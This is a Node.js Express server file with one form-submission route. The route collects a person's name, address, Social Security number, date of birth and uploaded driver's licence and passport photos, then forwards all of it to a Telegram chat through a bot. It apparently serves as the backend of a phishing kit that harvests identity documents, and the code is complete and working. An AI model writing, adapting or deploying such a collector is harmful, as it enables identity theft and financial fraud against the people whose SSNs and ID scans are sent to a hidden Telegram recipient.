const express = require('express');
const multer = require('multer');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3004;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;




// Setup multer for file uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/');
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + '-' + file.originalname);
  }
});
const upload = multer({ storage: storage });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Route to handle form submission
app.post('/submit-form', upload.fields([{ name: 'driversLicense' }, { name: 'passportPhoto' }]), async (req, res) => {
  try {
    const formData = req.body;
    const driversLicensePath = req.files['driversLicense'] ? req.files['driversLicense'][0].path : null;
    const passportPhotoPath = req.files['passportPhoto'] ? req.files['passportPhoto'][0].path : null;

    const message = `
    First Name: ${formData.firstName}
    Last Name: ${formData.lastName}
    Middle Name: ${formData.middleName}
    Phone Number: ${formData.phoneNumber}
    Email: ${formData.email}
    Address: ${formData.address}
    SSN: ${formData.ssn}
    Date of Birth: ${formData.dob}
    Gender: ${formData.gender}
    `;

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });

    if (driversLicensePath) {
      const driversLicenseStream = fs.createReadStream(path.join(__dirname, driversLicensePath));
      const driversLicenseFormData = new FormData();
      driversLicenseFormData.append('chat_id', TELEGRAM_CHAT_ID);
      driversLicenseFormData.append('photo', driversLicenseStream);

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, driversLicenseFormData, {
        headers: driversLicenseFormData.getHeaders()
      });
    }

    if (passportPhotoPath) {
      const passportPhotoStream = fs.createReadStream(path.join(__dirname, passportPhotoPath));
      const passportPhotoFormData = new FormData();
      passportPhotoFormData.append('chat_id', TELEGRAM_CHAT_ID);
      passportPhotoFormData.append('photo', passportPhotoStream);

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, passportPhotoFormData, {
        headers: passportPhotoFormData.getHeaders()
      });
    }

    res.status(200).send('Form submitted successfully.');
  } catch (error) {
    console.error('Error submitting form:', error);
    res.status(500).send('Failed to submit form.');
  }
});


// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
